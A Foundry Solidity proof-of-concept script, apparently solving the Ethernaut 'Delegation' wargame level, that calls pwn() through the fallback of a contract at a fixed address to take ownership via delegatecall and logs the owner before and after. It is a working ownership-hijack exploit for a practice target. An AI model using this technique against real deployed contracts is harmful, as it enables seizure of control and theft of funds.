// SPDX-License-Idetifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/6_Delegation.sol";

contract POC is Script {
    Delegation public target;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = Delegation(0x756B8Ca8F5D3B5Fa9FC035803F9fc72e572ce82D);
        address owner = target.owner();
        console.log("before owner: ", owner);

        address(target).call(abi.encodeWithSignature("pwn()"));

        owner = target.owner();
        console.log("after owner: ", owner);
        vm.stopBroadcast();
    }
}